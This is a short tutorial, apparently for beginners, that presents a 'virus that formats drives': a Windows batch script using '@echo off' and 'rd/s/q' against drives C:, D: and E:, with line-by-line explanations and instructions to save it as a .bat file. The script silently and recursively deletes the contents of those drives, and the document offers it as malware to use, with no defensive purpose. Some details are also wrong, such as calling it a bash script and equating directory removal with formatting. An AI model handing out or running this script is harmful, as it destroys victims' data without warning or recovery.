### VIRUS THAT FORMATS DRIVES.

**STEPS**
- Open notepad and write the following bash scripts:

```
@echo off   
rd/s/q D:   
rd/s/q C:   
rd/s/q E: 
```


Here, <br>


> echo means, it is used to display amy message or string, just like priting the message in the screen. By defauly it is in 'on' mode, but when we turn off, using '@echo off', 
then it prevents every message and commands to view on the screen, including itself. 
<br>

> rd means, 'remove directory' , which means to remove the directory or the folder from the system.
<br>

> /s means, specified directories or subdirectories, and deletes the directories including the files which is inside it.
<br>

> /q means, quiet mode, and it doesn't prompt any notification or any confirmation when deleting any directory.
<br>

> C, D, E are the name of drives/folder/directories, which needs to be formatted completely.
<br>
- Save these command of notepad as anything.bat, name can be anything, but the saved extension should be '.bat'.
